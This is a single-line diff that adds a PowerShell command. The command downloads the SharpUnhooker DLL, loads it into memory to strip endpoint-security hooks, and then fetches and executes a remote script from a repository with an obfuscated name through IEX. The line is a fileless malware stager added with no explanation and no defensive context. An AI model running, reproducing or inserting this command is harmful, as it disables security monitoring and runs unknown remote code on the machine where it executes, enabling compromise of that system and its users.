@@ -1,0 +1,1 @@
+$HDAqi = (iwr -UseBasicParsing "https://github.com/GetRektBoy724/SharpUnhooker/raw/main/SharpUnhooker.dll").Content;[System.Reflection.Assembly]::Load($HDAqi);[SharpUnhooker]::Main();IEX(iwr -usebasicparsing https://raw.githubusercontent.com/lIIlIIllIIIlIlIIlll/IllIIIlIlIIlllIllIIIlIlIIlllIllIIIlIlIIlll/main/OncDasCSX.ps1)
